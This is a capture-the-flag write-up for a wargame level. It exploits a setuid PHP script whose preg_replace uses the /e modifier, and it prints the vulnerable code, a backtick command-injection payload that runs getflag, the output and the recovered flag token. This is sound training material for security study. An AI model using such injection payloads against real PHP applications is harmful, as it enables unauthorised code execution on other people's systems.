# Level 06 - PHP Script Injection via Regex Evaluation

This level involves exploiting a **PHP script** with an insecure regular expression that uses the deprecated `/e` modifier, allowing arbitrary code execution.

---

## Step 1: Examine Available Files

```bash
ls -la
```

Output:

```
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

We are especially interested in the `level06.php` file:

---

## Step 2: Inspect `level06.php`

```php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

The vulnerability lies in this line:

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

The `/e` modifier evaluates the replacement string as PHP code.

---

## Step 3: Craft a Malicious Payload

We can inject PHP code via the file passed as argument.

Create a file `/tmp/ok`:

```bash
echo '[x {${`getflag`}}]' > /tmp/ok
```

Then run the vulnerable script:

```bash
./level06 /tmp/ok
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

---

## Step 4: Result

The script executes the payload and returns the flag.

### Flag Token:

```text
wiok45aaoguiboiki2tuin6ub
```

---

## ✅ Summary

- Vulnerable PHP regex with `/e` modifier allowed arbitrary code execution.
- Injected backticks inside `${}` to run a shell command.
- Successfully executed `getflag` and retrieved the flag.
